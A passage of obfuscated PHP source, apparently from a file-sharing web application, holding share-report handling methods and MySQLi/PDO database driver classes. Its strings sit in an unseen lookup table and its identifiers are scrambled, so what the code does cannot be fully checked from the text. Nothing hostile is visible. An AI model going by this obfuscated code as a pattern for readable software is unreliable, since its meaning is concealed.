listDataApply($¯©Ş³ø©) { $this->_listDataApply($¯©Ş³ø©); return $¯©Ş³ø©; } private function _listDataApply(&$½¦Ÿª—ä) { $«Íœš¹ =& $_SERVER[¤·²È‰º]; $ ´Ÿµú— = array_to_keyvalue($½¦Ÿª—ä, $«Íœš¹[12], $«Íœš¹[1651]); $ËÌŠõ³ã = Model($«Íœš¹[543])->userListInfo(array_unique($ ´Ÿµú—)); $·—“Àç = array_to_keyvalue($½¦Ÿª—ä, $«Íœš¹[12], $«Íœš¹[410]); $ë„®Æªï = Model($«Íœš¹[826])->sourceListInfo($·—“Àç, !0); foreach ($½¦Ÿª—ä as $øÊĞšÏÂ => &$¯Î¦¦Àé) { $¿¼İá„ü = $¯Î¦¦Àé[$«Íœš¹[1651]]; $¯Î¦¦Àé[$«Íœš¹[1991]] = $ËÌŠõ³ã[$¿¼İá„ü] ? $ËÌŠõ³ã[$¿¼İá„ü] : !1; $Ñ…¿¼±ü = $¯Î¦¦Àé[$«Íœš¹[410]]; $¯Î¦¦Àé[$«Íœš¹[96]] = $ë„®Æªï[$Ñ…¿¼±ü] ? $ë„®Æªï[$Ñ…¿¼±ü] : !1; if ($¯Î¦¦Àé[$«Íœš¹[96]][$«Íœš¹[439]] == $«Íœš¹[98]) { unset($½¦Ÿª—ä[$øÊĞšÏÂ]); } if ($¯Î¦¦Àé[$«Íœš¹[96]] != $«Íœš¹[207] && !$¯Î¦¦Àé[$«Íœš¹[96]]) { unset($½¦Ÿª—ä[$øÊĞšÏÂ]); } } unset($¯Î¦¦Àé); $½¦Ÿª—ä = array_values($½¦Ÿª—ä); } private function _makeOrder($şİåÌ’í = '') { $®İ»›Ò› =& $_SERVER[¤·²È‰º]; $€É¿Èß» = array($®İ»›Ò›[210], $®İ»›Ò›[505], $®İ»›Ò›[1980], $®İ»›Ò›[1981]); $„‡³ü¨à = array($®İ»›Ò›[458] => $®İ»›Ò›[459], $®İ»›Ò›[460] => $®İ»›Ò›[461]); $×Ù¨í¢› = Input::get($®İ»›Ò›[465], $®İ»›Ò›[7], $®İ»›Ò›[431], $€É¿Èß»); $ÌÕÊõ¨Ğ = Input::get($®İ»›Ò›[466], $®İ»›Ò›[7], $®İ»›Ò›[1992], array($®İ»›Ò›[1914], $®İ»›Ò›[460])); $ÌÕÊõ¨Ğ = $„‡³ü¨à[$ÌÕÊõ¨Ğ]; $şİåÌ’í = $şİåÌ’í . "{$×Ù¨í¢›}\40{$ÌÕÊõ¨Ğ}"; return $this->order($şİåÌ’í); } public function reportAdd($Ù“¿ú–) { $ï±çæÃÀ =& $_SERVER[¤·²È‰º]; $Í³ÕøõØ = array($ï±çæÃÀ[497] => $Ù“¿ú–[$ï±çæÃÀ[497]], $ï±çæÃÀ[1651] => USER_ID); if (Model($ï±çæÃÀ[1988])->where($Í³ÕøõØ)->find()) { return !1; } $ùŒ¯Õû = array($ï±çæÃÀ[497] => $Ù“¿ú–[$ï±çæÃÀ[497]], $ï±çæÃÀ[1550] => $Ù“¿ú–[$ï±çæÃÀ[1550]], $ï±çæÃÀ[410] => $Ù“¿ú–[$ï±çæÃÀ[410]], $ï±çæÃÀ[476] => $Ù“¿ú–[$ï±çæÃÀ[476]], $ï±çæÃÀ[1651] => USER_ID, $ï±çæÃÀ[43] => $Ù“¿ú–[$ï±çæÃÀ[43]], $ï±çæÃÀ[461] => $Ù“¿ú–[$ï±çæÃÀ[461]]); return Model($ï±çæÃÀ[1988])->add($ùŒ¯Õû); } public function reportList($êƒ¼ó”–) { $†Ç³ëÅ =& $_SERVER[¤·²È‰º]; $š ›—„¸ = array(); if ($êƒ¼ó”–[$†Ç³ëÅ[762]]) { $œ™æ»ıÁ = $êƒ¼ó”–[$†Ç³ëÅ[505]] ? $êƒ¼ó”–[$†Ç³ëÅ[505]] : strtotime(date($†Ç³ëÅ[1990])); $š ›—„¸[$†Ç³ëÅ[210]] = array($†Ç³ëÅ[342], array($êƒ¼ó”–[$†Ç³ëÅ[762]], $œ™æ»ıÁ)); } if (isset($êƒ¼ó”–[$†Ç³ëÅ[43]]) && in_array($êƒ¼ó”–[$†Ç³ëÅ[43]], array($†Ç³ëÅ[98], $†Ç³ëÅ[445], $†Ç³ëÅ[1993], $†Ç³ëÅ[1994], $†Ç³ëÅ[1995]))) { $š ›—„¸[$†Ç³ëÅ[43]] = $êƒ¼ó”–[$†Ç³ëÅ[43]]; } if (isset($êƒ¼ó”–[$†Ç³ëÅ[751]]) && in_array($êƒ¼ó”–[$†Ç³ëÅ[751]], array($†Ç³ëÅ[207], $†Ç³ëÅ[98], $†Ç³ëÅ[445], $†Ç³ëÅ[1993]))) { $š ›—„¸[$†Ç³ëÅ[751]] = $êƒ¼ó”–[$†Ç³ëÅ[751]]; } $ëÙëşŞ = Input::get($†Ç³ëÅ[466], $†Ç³ëÅ[7], $†Ç³ëÅ[1992], array($†Ç³ëÅ[1914], $†Ç³ëÅ[460])); $ôˆİ¥ˆ˜ = array($†Ç³ëÅ[458] => $†Ç³ëÅ[459], $†Ç³ëÅ[460] => $†Ç³ëÅ[461]); $ĞğÄØâê = $†Ç³ëÅ[1996] . $ôˆİ¥ˆ˜[$ëÙëşŞ]; $½â¢ÅÕñ = Model($†Ç³ëÅ[1988])->where($š ›—„¸)->order($ĞğÄØâê)->selectPage(20); if (empty($½â¢ÅÕñ[$†Ç³ëÅ[378]])) { return array(); } $Ç²¢®àÙ = array_to_keyvalue_group($½â¢ÅÕñ[$†Ç³ëÅ[378]], $†Ç³ëÅ[751], $†Ç³ëÅ[497]); if (!empty($Ç²¢®àÙ[0])) { $êƒ¼ó”– = $Ç²¢®àÙ[0]; $š ›—„¸ = array($†Ç³ëÅ[497] => array($†Ç³ëÅ[7], $êƒ¼ó”–)); $Š†Ü§šº = $this->where($š ›—„¸)->field($†Ç³ëÅ[497])->select(); $Š†Ü§šº = array_to_keyvalue($Š†Ü§šº, $†Ç³ëÅ[12], $†Ç³ëÅ[497]); $¾’í¾´„ = array_diff($êƒ¼ó”–, $Š†Ü§šº); if (!empty($¾’í¾´„)) { foreach ($½â¢ÅÕñ[$†Ç³ëÅ[378]] as $Ø–¶µÈ» => $ÇÓ¥Ÿ¥) { if (in_array($ÇÓ¥Ÿ¥[$†Ç³ëÅ[497]], $¾’í¾´„)) { unset($½â¢ÅÕñ[$†Ç³ëÅ[378]][$Ø–¶µÈ»]); } } } } $this->_listDataApply($½â¢ÅÕñ[$†Ç³ëÅ[378]]); return $½â¢ÅÕñ; } public function reportStatus($½ú’Ş”÷) { $¼Š‹´İ =& $_SERVER[¤·²È‰º]; $„°Òó = array($¼Š‹´İ[407] => $½ú’Ş”÷[$¼Š‹´İ[407]]); $½¸»ÈÚÈ = Model($¼Š‹´İ[1988])->where($„°Òó)->field($¼Š‹´İ[1997])->find(); if (!$½¸»ÈÚÈ) { return !1; } $å„ÙˆæÚ = array($¼Š‹´İ[751] => $½ú’Ş”÷[$¼Š‹´İ[751]]); if ($½ú’Ş”÷[$¼Š‹´İ[751]] == $¼Š‹´İ[1993] && $½¸»ÈÚÈ[$¼Š‹´İ[751]] == $¼Š‹´İ[1993]) { $å„ÙˆæÚ[$¼Š‹´İ[751]] = 0; } $“ˆæ– = Model($¼Š‹´İ[1988])->where($„°Òó)->save($å„ÙˆæÚ); if ($½ú’Ş”÷[$¼Š‹´İ[751]] == $¼Š‹´İ[445]) { if ($½¸»ÈÚÈ[$¼Š‹´İ[476]] != $¼Š‹´İ[207] && $this->shareFileMeta($½¸»ÈÚÈ[$¼Š‹´İ[476]])) { $this->shareFileMeta($½¸»ÈÚÈ[$¼Š‹´İ[476]], 0); } $this->remove($½¸»ÈÚÈ[$¼Š‹´İ[497]]); return !0; } if ($“ˆæ– && $½ú’Ş”÷[$¼Š‹´İ[751]] == $¼Š‹´İ[1993]) { $œ»ÓÑ· = $å„ÙˆæÚ[$¼Š‹´İ[751]] == $¼Š‹´İ[1993] ? 1 : 0; $this->shareFileMeta($½¸»ÈÚÈ[$¼Š‹´İ[476]], $œ»ÓÑ·); $this->removeByFile($½¸»ÈÚÈ[$¼Š‹´İ[476]]); } return $“ˆæ–; } private function removeByFile($Áê²Ş€) { $î÷é½ =& $_SERVER[¤·²È‰º]; $öÍÇ‘ = Model($î÷é½[826])->where(array($î÷é½[476] => $Áê²Ş€))->field($î÷é½[410])->select(); $úöÛ €Ò = array_to_keyvalue($öÍÇ‘, $î÷é½[12], $î÷é½[410]); $ÍøÚóø¯ = array($î÷é½[410] => array($î÷é½[7], $úöÛ €Ò), $î÷é½[502] => 1); $öÍÇ‘ = $this->where($ÍøÚóø¯)->field($î÷é½[497])->select(); if (empty($öÍÇ‘)) { return; } $š¶¤ì¿Ş = array_to_keyvalue($öÍÇ‘, $î÷é½[12], $î÷é½[497]); $this->remove($š¶¤ì¿Ş); } private function shareFileMeta($ôú›×÷†, $âÛğÙèé = null) { $¤§¡Éø´ =& $_SERVER[¤·²È‰º]; $‹ú«—… = array($¤§¡Éø´[476] => $ôú›×÷†, $¤§¡Éø´[104] => $¤§¡Éø´[1998]); if (is_null($âÛğÙèé)) { return Model($¤§¡Éø´[1999])->where($‹ú«—…)->find(); } $‹ú«—…[$¤§¡Éø´[383]] = $âÛğÙèé; Model($¤§¡Éø´[1999])->add($‹ú«—…, array(), !0); } } goto d’¬åËİÆ‚; BÎ•…‚„¶¯: class DbMysqli extends Db { public function __construct($¹Ë¸˜œö = '') { $Ò¦å±ô™ =& $_SERVER[¤·²È‰º]; if (!extension_loaded($Ò¦å±ô™[906])) { think_exception(think_lang($Ò¦å±ô™[24]) . $Ò¦å±ô™[907]); } if (!empty($¹Ë¸˜œö)) { $this->config = $¹Ë¸˜œö; if (empty($this->config[$Ò¦å±ô™[27]])) { $this->config[$Ò¦å±ô™[27]] = $Ò¦å±ô™[12]; } } } public function connect($«şœ“–¥ = '', $¬ºÚ‚¹ˆ = 0) { $™ñ¢Šèô =& $_SERVER[¤·²È‰º]; if (!isset($this->linkID[$¬ºÚ‚¹ˆ])) { if (empty($«şœ“–¥)) { $«şœ“–¥ = $this->config; } $this->linkID[$¬ºÚ‚¹ˆ] = new mysqli($«şœ“–¥[$™ñ¢Šèô[880]], $«şœ“–¥[$™ñ¢Šèô[882]], $«şœ“–¥[$™ñ¢Šèô[883]], $«şœ“–¥[$™ñ¢Šèô[31]], $«şœ“–¥[$™ñ¢Šèô[881]] ? intval($«şœ“–¥[$™ñ¢Šèô[881]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $÷¼ñ¯ = $this->linkID[$¬ºÚ‚¹ˆ]->server_version; $this->linkID[$¬ºÚ‚¹ˆ]->query($™ñ¢Šèô[884] . think_config($™ñ¢Šèô[885]) . $™ñ¢Šèô[68]); if ($÷¼ñ¯ > $™ñ¢Šèô[886]) { $this->linkID[$¬ºÚ‚¹ˆ]->query($™ñ¢Šèô[887]); } $this->connected = !0; if (1 != think_config($™ñ¢Šèô[32])) { unset($this->config); } } return $this->linkID[$¬ºÚ‚¹ˆ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($òÕ¨‚À’) { $®ÅÜúõ£ =& $_SERVER[¤·²È‰º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $òÕ¨‚À’; if ($this->queryID) { $this->free(); } think_action_status($®ÅÜúõ£[33], 1); think_status($®ÅÜúõ£[34]); $this->queryID = $this->_linkID->query($òÕ¨‚À’); if ($this->_linkID->more_results()) { while (($Õ¯§ôşô = $this->_linkID->next_result()) != NULL) { $Õ¯§ôşô->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($÷áé¦¢Á) { $É˜ö€ëœ =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $÷áé¦¢Á; if ($this->queryID) { $this->free(); } think_action_status($É˜ö€ëœ[35], 1); think_status($É˜ö€ëœ[34]); $•¨ÀÈ„¡ = $this->_linkID->query($÷áé¦¢Á); $this->debug(); if (!1 === $•¨ÀÈ„¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íÆ„æßÓ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$íÆ„æßÓ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»´‘÷¹¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»´‘÷¹¤) { $this->error(); return !1; } } return !0; } private function getAll() { $¿éã€…” = array(); if ($this->numRows > 0) { for ($¬˜¿×Òš = 0; $¬˜¿×Òš < $this->numRows; $¬˜¿×Òš++) { $¿éã€…”[$¬˜¿×Òš] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¿éã€…”; } public function getFields($•°››í) { $ƒĞñ›ö« =& $_SERVER[¤·²È‰º]; $‹—«°ê = $this->query($ƒĞñ›ö«[891] . $this->parseKey($•°››í)); $«ˆÓÊ³› = array(); if ($‹—«°ê) { foreach ($‹—«°ê as $±¨˜ÈïŞ => $À³ıËÙ‹) { $«ˆÓÊ³›[$À³ıËÙ‹[$ƒĞñ›ö«[41]]] = array($ƒĞñ›ö«[42] => $À³ıËÙ‹[$ƒĞñ›ö«[41]], $ƒĞñ›ö«[43] => $À³ıËÙ‹[$ƒĞñ›ö«[44]], $ƒĞñ›ö«[45] => (bool) ($À³ıËÙ‹[$ƒĞñ›ö«[46]] === $ƒĞñ›ö«[12]), $ƒĞñ›ö«[47] => $À³ıËÙ‹[$ƒĞñ›ö«[48]], $ƒĞñ›ö«[49] => strtolower($À³ıËÙ‹[$ƒĞñ›ö«[50]]) == $ƒĞñ›ö«[51], $ƒĞñ›ö«[52] => strtolower($À³ıËÙ‹[$ƒĞñ›ö«[53]]) == $ƒĞñ›ö«[54]); } } return $«ˆÓÊ³›; } public function getTables($ƒˆÆ”‡¬ = '') { $œş¹õ‹ƒ =& $_SERVER[¤·²È‰º]; $öÖÊ›û’ = !empty($ƒˆÆ”‡¬) ? $œş¹õ‹ƒ[893] . $ƒˆÆ”‡¬ . $œş¹õ‹ƒ[894] : $œş¹õ‹ƒ[895]; $ä»—Áß· = $this->query($öÖÊ›û’); $ø ÌÄ‰À = array(); if ($ä»—Áß·) { foreach ($ä»—Áß· as $¼îööÄè => $÷ìÑğ™) { $ø ÌÄ‰À[$¼îööÄè] = current($÷ìÑğ™); } } return $ø ÌÄ‰À; } public function replace($ûõ“‚¦¶, $¢¯öóŸ = array()) { $ÕÖ€ãûã =& $_SERVER[¤·²È‰º]; foreach ($ûõ“‚¦¶ as $»œ†‰–˜ => $ÍòÂıº£) { $ùê»èË = $this->parseValue($ÍòÂıº£); if (is_scalar($ùê»èË)) { $É›¢ÊŞÄ[] = $ùê»èË; $­‡Ä²á¿[] = $this->parseKey($»œ†‰–˜); } } $®Ÿ³ã = $ÕÖ€ãûã[896] . $this->parseTable($¢¯öóŸ[$ÕÖ€ãûã[288]]) . $ÕÖ€ãûã[897] . implode($ÕÖ€ãûã[60], $­‡Ä²á¿) . $ÕÖ€ãûã[898] . implode($ÕÖ€ãûã[60], $É›¢ÊŞÄ) . $ÕÖ€ãûã[899]; return $this->execute($®Ÿ³ã); } public function insertAll($Ÿ¶®ø¨, $şÎŸµë° = array(), $¬¯‰Í = false) { $çÀŠË— =& $_SERVER[¤·²È‰º]; if (!is_array($Ÿ¶®ø¨[0])) { return !1; } $ûÉ¯åı = array_keys($Ÿ¶®ø¨[0]); $½‘öø©— = array(); foreach ($Ÿ¶®ø¨ as $üêëñÂŠ) { $Î¶½²‘ü = array(); foreach ($üêëñÂŠ as $ÎÉÎßØ => $«–ªõÇÁ) { $«–ªõÇÁ = $this->parseValue($«–ªõÇÁ); if (is_scalar($«–ªõÇÁ)) { $Î¶½²‘ü[] = $«–ªõÇÁ; } } $½‘öø©—[] = $çÀŠË—[269] . implode($çÀŠË—[60], $Î¶½²‘ü) . $çÀŠË—[899]; } array_walk($ûÉ¯åı, array($this, $çÀŠË—[900])); $‹šÂÀñ = $¬¯‰Í ? $çÀŠË—[901] : $çÀŠË—[902]; $¹ÄÖ«êá = $‹šÂÀñ . $çÀŠË—[903] . $this->parseTable($şÎŸµë°[$çÀŠË—[288]]) . $çÀŠË—[897] . implode($çÀŠË—[60], $ûÉ¯åı) . $çÀŠË—[904] . implode($çÀŠË—[60], $½‘öø©—); return $this->execute($¹ÄÖ«êá); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Şç¡Ÿ“Ä =& $_SERVER[¤·²È‰º]; $this->error = $this->_linkID->errno . $Şç¡Ÿ“Ä[4] . $this->_linkID->error; if ($Şç¡Ÿ“Ä[12] != $this->queryStr) { $this->error .= LNG($Şç¡Ÿ“Ä[58]) . $this->queryStr; } think_trace($this->error, $Şç¡Ÿ“Ä[12], $Şç¡Ÿ“Ä[59]); return $this->error; } public function escapeString($‚éú¶±­) { if ($this->_linkID) { return $this->_linkID->real_escape_string($‚éú¶±­); } else { return addslashes($‚éú¶±­); } } public function parseKey(&$çŒÇµ¹, $Úˆ½å = true) { $­ø“Ïã– =& $_SERVER[¤·²È‰º]; if ($Úˆ½å) { $çŒÇµ¹ = $this->parseKeyCheck($çŒÇµ¹); } if ($çŒÇµ¹ != $­ø“Ïã–[198] && !preg_match($­ø“Ïã–[905], $çŒÇµ¹)) { $çŒÇµ¹ = $­ø“Ïã–[393] . trim($çŒÇµ¹, $­ø“Ïã–[393]) . $­ø“Ïã–[393]; } return $çŒÇµ¹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Áé¯éêı = '') { $Ú…ºÎé =& $_SERVER[¤·²È‰º]; if (!class_exists($Ú…ºÎé[908])) { think_exception(think_lang($Ú…ºÎé[24]) . $Ú…ºÎé[909]); } if (!empty($Áé¯éêı)) { $this->config = $Áé¯éêı; if (empty($this->config[$Ú…ºÎé[27]])) { $this->config[$Ú…ºÎé[27]] = array(); } } } public function connect($öÇÃÀ‰Ø = '', $îŸëÊı = 0) { $ıò¿øèü =& $_SERVER[¤·²È‰º]; if (!isset($this->linkID[$îŸëÊı])) { if (empty($öÇÃÀ‰Ø)) { $öÇÃÀ‰Ø = $this->config; } $¨êı‘© = !empty($öÇÃÀ‰Ø[$ıò¿øèü[27]][$ıò¿øèü[28]]) ? $öÇÃÀ‰Ø[$ıò¿øèü[27]][$ıò¿øèü[28]] : $this->pconnect; if ($¨êı‘©) { $öÇÃÀ‰Ø[$ıò¿øèü[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$îŸëÊı] = new PDO($öÇÃÀ‰Ø[$ıò¿øèü[910]], $öÇÃÀ‰Ø[$ıò¿øèü[882]], $öÇÃÀ‰Ø[$ıò¿øèü[883]], $öÇÃÀ‰Ø[$ıò¿øèü[27]]); } catch (PDOException $èàÆÖèô) { think_exception($èàÆÖèô->getMessage()); } $this->dbType = $this->_getDsnType($öÇÃÀ‰Ø[$ıò¿øèü[910]]); if (in_array($this->dbType, array($ıò¿øèü[911], $ıò¿øèü[912], $ıò¿øèü[913], $ıò¿øèü[914]))) { think_exception($ıò¿øèü[915] . $this->dbType . $ıò¿øèü[916] . $this->dbType . $ıò¿øèü[917]); } if (!$this->linkID[$îŸëÊı]) { think_exception($ıò¿øèü[918]); } try { $this->linkID[$îŸëÊı]->exec($ıò¿øèü[919] . think_config($ıò¿øèü[885])); } catch (Exception $èàÆÖèô) { } $this->connected = !0; if (1 != think_config($ıò¿øèü[32])) { unset($this->config); } } return $this->linkID[$îŸëÊı]; } public function free() { $this->PDOStatement = null; } public function query($ı©ĞŸ¹ˆ, $©ï‚ˆŠ€ = array()) { $ïÔš™ĞÇ =& $_SERVER[¤·²È‰º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ı©ĞŸ¹ˆ; if (!empty($©ï‚ˆŠ€)) { $this->queryStr .= $ïÔš™ĞÇ[920] . print_r($©ï‚ˆŠ€, !0) . $ïÔš™ĞÇ[921]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ïÔš™ĞÇ[33], 1); think_status($ïÔš™ĞÇ[34]); $this->PDOStatement = $this->_linkID->prepare($ı©ĞŸ¹ˆ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¨Û­‘æš = $this->PDOStatement->execute($©ï‚ˆŠ€); $this->debug(); if (!1 === $¨Û­‘æš) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ŒËˆÇ„, $šÈ¾ºçø = array()) { $Šı‚†§ø =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒËˆÇ„; if (!empty($šÈ¾ºçø)) { $this->queryStr .= $Šı‚†§ø[920] . print_r($šÈ¾ºçø, !0) . $Šı‚†§ø[921]; } $İÀÇ÷á‚ = !1; if ($this->dbType == $Šı‚†§ø[914]) { if (preg_match($Šı‚†§ø[922], $this->queryStr, $·³®ÔÒ‹)) { $this->table = think_config($Šı‚†§ø[923]) . str_ireplace(think_config($Šı‚†§ø[924]), $Šı‚†§ø[22], $·³®ÔÒ‹[2]); $İÀÇ÷á‚ = (bool) $this->query($Šı‚†§ø[925] . strtoupper($this->table) . $Šı‚†§ø[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Šı‚†§ø[35], 1); think_status($Šı‚†§ø[34]); $this->PDOStatement = $this->_linkID->prepare($ŒËˆÇ„); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $À÷ˆ“ìÚ = $this->PDOStatement->execute($šÈ¾ºçø); $this->debug(); if (!1 === $À÷ˆ“ìÚ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($İÀÇ÷á‚ || preg_match($Šı‚†§ø[926], $ŒËˆÇ„)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕÒ¼õ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÕÒ¼õ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ğ§µÕ‚î = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ğ§µÕ‚î) { $this->error(); return !1; } } return !0; } private function getAll() { $ş›õ•ı = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ş›õ•ı); return $ş›õ•ı; } public function getFields($ØµÀà‘å) { $Áµ¾ô‚» =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (think_config($Áµ¾ô‚»[927])) { $“Õ’¥ö = str_replace($Áµ¾ô‚»[928], $ØµÀà‘å, think_config($Áµ¾ô‚»[927])); } else { switch ($this->dbType) { case $Áµ¾ô‚»[911]: case $Áµ¾ô‚»[929]: $“Õ’¥ö = "\x53\x45\114\105\x43\x54\40\x20\40\143\x6f\x6c\x75\x6d\x6e\x5f\x6e\141\x6d\x65\x20\141\163\40\x27\x4e\x61\x6d\x65\47\54\40\40\40\144\141\x74\x61\x5f\164\x79\x70\145\x20\x61\x73\x20\x27\124\x79\160\145\x27\x2c\40\x20\40\143\x6f\154\165\155\x6e\137\144\145\x66\141\x75\x6c\x74\40\141\x73\40\x27\x44\x65\146\x61\x75\x6c\x74\47\x2c\x20\x20\x20\151\x73\x5f\x6e\165\x6c\154\141\142\x6c\145\40\x61\x73\40\47\x4e\x75\x6c\154\47\12\11\11\106\122\x4f\115\x9\x69\156\x66\157\x72\155\x61\164\151\x6f\156\137\163\143\150\145\x6d\x61\x2e\x74\x61\x62\x6c\x65\163\40\x41\x53\x20\164\12\11\11\112\x4f\x49\x4e\x9\x69\x6e\146\x6f\x72\x6d\x61\164\151\157\156\137\x73\143\150\x65\x6d\x61\56\x63\157\154\x75\x6d\x6e\x73\40\x41\x53\40\x63\xa\x9\x9\x4f\116\40\x20\164\56\x74\x61\x62\154\145\x5f\143\141\x74\x61\x6c\157\147\40\x3d\40\x63\x2e\x74\x61\142\154\145\x5f\x63\x61\164\x61\154\x6f\x67\xa\x9\x9\x41\116\x44\40\x74\56\x74\141\x62\x6c\x65\137\x73\143\150\145\x6d\141\x20\75\40\143\56\164\x61\142\154\145\137\163\143\x68\x65\x6d\x61\12\11\11\101\116\x44\x20\164\x2e\164\141\x62\154\x65\x5f\x6e\141\x6d\x65\40\x3d\x20\143\x2e\x74\x61\x62\154\145\x5f\x6e\x61\x6d\x65\xa\x9\11\127\x48\x45\x52\105\40\40\x20\164\x2e\x74\x61\142\154\x65\137\x6e\141\155\145\40\75\x20\47{$ØµÀà‘å}\47"; break; case $Áµ¾ô‚»[930]: $“Õ’¥ö = $Áµ¾ô‚»[931] . $ØµÀà‘å . $Áµ¾ô‚»[932]; break; case $Áµ¾ô‚»[912]: case $Áµ¾ô‚»[914]: $“Õ’¥ö = $Áµ¾ô‚»[933] . $Áµ¾ô‚»[934] . $Áµ¾ô‚»[935] . strtoupper($ØµÀà‘å) . $Áµ¾ô‚»[936] . strtoupper($ØµÀà‘å) . $Áµ¾ô‚»[937]; break; case $Áµ¾ô‚»[938]: $“Õ’¥ö = $Áµ¾ô‚»[939] . $ØµÀà‘å . $Áµ¾ô‚»[940]; break; case $Áµ¾ô‚»[913]: break; case $Áµ¾ô‚»[941]: default: $“Õ’¥ö = $Áµ¾ô‚»[942] . ($this->dbType == $Áµ¾ô‚»[941] ? "\x60{$ØµÀà‘å}\x60" : $ØµÀà‘å); } } $à§¢Ô” = $this->query($“Õ’¥ö); $»Æ€Æèô = array(); if ($à§¢Ô”) { foreach ($à§¢Ô” as $©é–îŠ— => $òÈ…ÓŒ²) { $òÈ…ÓŒ² = array_change_key_case($òÈ…ÓŒ²); $òÈ…ÓŒ²[$Áµ¾ô‚»[42]] = isset($òÈ…ÓŒ²[$Áµ¾ô‚»[42]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[42]] : $Áµ¾ô‚»[22]; $òÈ…ÓŒ²[$Áµ¾ô‚»[43]] = isset($òÈ…ÓŒ²[$Áµ¾ô‚»[43]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[43]] : $Áµ¾ô‚»[22]; $­¨×éÛ = isset($òÈ…ÓŒ²[$Áµ¾ô‚»[282]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[282]] : $òÈ…ÓŒ²[$Áµ¾ô‚»[42]]; $»Æ€Æèô[$­¨×éÛ] = array($Áµ¾ô‚»[42] => $­¨×éÛ, $Áµ¾ô‚»[43] => $òÈ…ÓŒ²[$Áµ¾ô‚»[43]], $Áµ¾ô‚»[45] => (bool) (isset($òÈ…ÓŒ²[$Áµ¾ô‚»[113]]) && $òÈ…ÓŒ²[$Áµ¾ô‚»[113]] === $Áµ¾ô‚»[12] || isset($òÈ…ÓŒ²[$Áµ¾ô‚»[45]]) && $òÈ…ÓŒ²[$Áµ¾ô‚»[45]] === $Áµ¾ô‚»[12]), $Áµ¾ô‚»[47] => isset($òÈ…ÓŒ²[$Áµ¾ô‚»[47]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[47]] : (isset($òÈ…ÓŒ²[$Áµ¾ô‚»[66]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[66]] : $Áµ¾ô‚»[22]), $Áµ¾ô‚»[49] => isset($òÈ…ÓŒ²[$Áµ¾ô‚»[104]]) ? strtolower($òÈ…ÓŒ²[$Áµ¾ô‚»[104]]) == $Áµ¾ô‚»[51] : (isset($òÈ…ÓŒ²[$Áµ¾ô‚»[67]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[67]] : !1), $Áµ¾ô‚»[52] => isset($òÈ…ÓŒ²[$Áµ¾ô‚»[943]]) ? strtolower($òÈ…ÓŒ²[$Áµ¾ô‚»[943]]) == $Áµ¾ô‚»[54] : (isset($òÈ…ÓŒ²[$Áµ¾ô‚»[104]]) ? $òÈ…ÓŒ²[$Áµ¾ô‚»[104]] : !1)); } } return $»Æ€Æèô; } public function getTables($àƒ€¶„¹ = '') { $Æñ×ìˆÍ =& $_SERVER[¤·²È‰º]; if (think_config($Æñ×ìˆÍ[944])) { $¯Ÿ©ˆè = str_replace($Æñ×ìˆÍ[945], $àƒ€¶„¹, think_config($Æñ×ìˆÍ[944])); } else { switch ($this->dbType) { case $Æñ×ìˆÍ[912]: case $Æñ×ìˆÍ[914]: $¯Ÿ©ˆè = $Æñ×ìˆÍ[946]; break; case $Æñ×ìˆÍ[911]: case $Æñ×ìˆÍ[929]: $¯Ÿ©ˆè = $Æñ×ìˆÍ[947]; break; case $Æñ×ìˆÍ[938]: $¯Ÿ©ˆè = $Æñ×ìˆÍ[948]; break; case $Æñ×ìˆÍ[913]: think_exception(think_lang($Æñ×ìˆÍ[949]) . $Æñ×ìˆÍ[950]); break; case $Æñ×ìˆÍ[930]: $¯Ÿ©ˆè = $Æñ×ìˆÍ[55] . $Æñ×ìˆÍ[56] . $Æñ×ìˆÍ[57]; break; case $Æñ×ìˆÍ[941]: default: if (!empty($àƒ€¶„¹)) { $¯Ÿ©ˆè = $Æñ×ìˆÍ[893] . $àƒ€¶„¹ . $Æñ×ìˆÍ[894]; } else { $¯Ÿ©ˆè = $Æñ×ìˆÍ[895]; } } } $Ûˆ£™ıâ = 